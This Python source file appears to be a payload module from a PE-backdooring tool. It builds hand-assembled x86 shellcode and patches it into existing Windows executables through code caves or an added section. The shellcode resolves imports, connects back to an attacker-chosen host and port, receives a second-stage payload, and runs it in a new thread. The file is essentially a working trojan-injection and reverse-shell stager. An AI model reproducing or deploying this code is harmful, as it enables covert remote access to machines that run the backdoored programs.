import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)


class iat_reverse_tcp_staged_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_reverse_tcp_staged_threaded"
        self.description = """Import Address Table reverse tcp shell """
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                                 b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'staged'
   
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):

        """
        Staged iat based payload.
        """

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                print("APIs not found")
                return False

        #Begin with shellcode 2:

        
        if self.MODE.lower() == 'cave_jumping':
            self.shellcode2 = b"\xe8"
            '''
            if self.PM.BDF.pe_object['XP_MODE'] is True:
                xp_offset = 0
            else:
            '''
            xp_offset = 11
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
        else:
            self.shellcode2 = b"\xE8\xE5\xFF\xFF\xFF"

        if self.MODE.lower() != 'add_section':
            if 'CavesPicked' in self.BDF.pe_object:
                self.shellcode2 += self.PM.BDF.pe_object['CleanCavesStub']

            else:
                self.shellcode2 += b"\x41" * 58

        self.shellcode2 += bytes("\xFC"
                            "\x60"                          # pushal
                            "\x89\xe5"                      # mov ebp, esp
                            "\x31\xd2"                      # xor edx, edx
                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                            # entry point is now in edx
                            , 'iso-8859-1')
        
        self.shellcode2 += b"\xbb"                           # mov value below to EBX
        if self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']))

        self.shellcode2 += b"\x01\xD3"                       # add EBX + EDX
        self.shellcode2 += b"\xb9"                           # mov value below to ECX

        if self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']))
        self.shellcode2 += b"\x01\xD1"                       # add ECX + EDX
        #LoadLibraryA in EBX
        #GetProcAddress in ECX

        self.shellcode2 += bytes("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                            "\x95\x6A\x05\x68", 'iso-8859-1')
        self.shellcode2 += common.pack_ip_addresses(self.HOST)          # HOST
        self.shellcode2 += b"\x68\x02\x00"
        self.shellcode2 += struct.pack('!H', int(self.PORT))      # PORT
        self.shellcode2 += bytes("\x89\xE2\x6A"
                            "\x10\x52\x51\x87\xF9\xFF\xD5"
                            , 'iso-8859-1')

        #breakupvar is the distance between codecaves
        #PART TWO
        #ESI getprocaddr
        #EBX loadliba
        #ESP ptr to sockaddr struct
        #EDI has the socket
        self.shellcode2 += bytes("\x89\xe5"              # mov edp, esp
                            "\x68\x33\x32\x00\x00"  # push ws2_32
                            "\x68\x77\x73\x32\x5F"  # ...
                            "\x54"                  # push esp
                            "\xFF\x13"              # call dword ptr [ebx]
                            "\x89\xc1"              # mov ecx, eax
                            "\x6A\x00"
                            "\x68\x72\x65\x63\x76"  # recv, 0
                            "\x54"                  # push esp
                            "\x51"                  # push ecx
                            "\xFF\x16"              # call dword ptr [esi]; get handle for recv
                            #save recv handle off
                            "\x50"                  # push eax; save revc handle for later
                            "\x6A\x00"              # push byte 0x0
                            "\x6A\x04"              # push byte 4
                            "\x55"                  # push ebp sockaddr struct
                            "\x57"                  # push edi (saved socket)
                            "\xff\xD0"              # call eax; recv (s, &dwLength, 4, 0)
                            #esp now points to recv handle
                            "\x8b\x34\x24"          # lea esi, [esp]
                            "\x8b\x6d\x00"          # mov ebp, dword ptr[ebp]
                            # Don't need loadliba/getprocaddr anymore
                            "\x31\xd2"                      # xor edx, edx
                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                            #entry point in EDX
                            , 'iso-8859-1')

        self.shellcode2 += b"\xbb"           # mov value below to EBX

        #Put VirtualAlloc in EBX
        if self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['ImageBase']))
        self.shellcode2 += b"\x01\xD3"  # add EBX + EDX
        self.shellcode2 += bytes("\x6a\x40"              # push byte 0x40
                            "\x68\x00\x10\x00\x00"  # push 0x1000
                            "\x55"                  # push ebp
                            "\x6A\x00"              # push byte 0
                            "\xff\x13"              # Call VirtualAlloc from thunk
                            # do not need virualalloc anymore
                            "\x93"                  # xchg ebx, eax
                            "\x53"                  # push ebx ; mem location (return to it later)
                            "\x6a\x00"              # push byte 0
                            "\x55"                  # push ebp ; length
                            "\x53"                  # push ebx ; current address
                            "\x57"                  # push edi ; socket
                            "\xFF\xD6"              # call esi ; recv handle
                            "\x01\xc3"              # add ebx, eax
                            "\x29\xc5"              # sub ebp, eax
                            "\x75\xf3"              # jump back
                            "\xc3"                  # ret
                            , 'iso-8859-1')

        
        #starts the VirtualAlloc/CreateThread section for the PAYLOAD
        self.shellcode1 = b"\xFC"  # Cld
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        '''
        self.shellcode1 += b"\xbb"           # mov value below to EBX
        #Put VirtualAlloc in EBX
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            if self.PM.BDF.pe_object['VirtualAlloc'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + self.PM.BDF.pe_object['VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] + 1)
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'])
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if self.PM.BDF.pe_object['CreateThread'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['CreateThread'] - self.PM.BDF.pe_object['ImageBase']) + 1)
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['CreateThread'] - self.PM.BDF.pe_object['ImageBase'])
        else:
            '''
        if self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'VirtualAlloc'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x01\xD3"  # add EBX + EDX
        #Put Create Thread in ECX
        self.shellcode1 += b"\xb9"  # mov value below to ECX
        if self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'CreateThread'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))

        #Add in memory base
        self.shellcode1 += b"\x01\xD1"  # add ECX + EDX
        self.shellcode1 += b"\x8B\xE9"  # mov EDI, ECX for save keeping

        self.shellcode1 += b"\xBE"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += bytes("\x6A\x40"
                            "\x68\x00\x10\x00\x00"
                            "\x56"
                            "\x6A\x00", 'iso-8859-1')
        self.shellcode1 += b"\xff\x13"                      # call dword ptr [ebx]
        self.shellcode1 += bytes("\x89\xC3"
                            "\x89\xC7"
                            "\x89\xF1"
                            , 'iso-8859-1')

        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xeb\x16"  # <--length of shellcode below

        self.shellcode1 += b"\x5e"
        self.shellcode1 += bytes("\xF2\xA4"
                            "\x31\xC0"
                            "\x50"
                            "\x50"
                            "\x50"
                            "\x53"
                            "\x50"
                            "\x50"
                            , 'iso-8859-1')

        self.shellcode1 += b"\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
        self.shellcode1 += bytes("\x58"
                            "\x61"                  # POP AD
                            , 'iso-8859-1')

        
        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 2)
            self.shellcode1 += b"\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += b"\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return self.stackpreserve + self.shellcode1, self.shellcode2
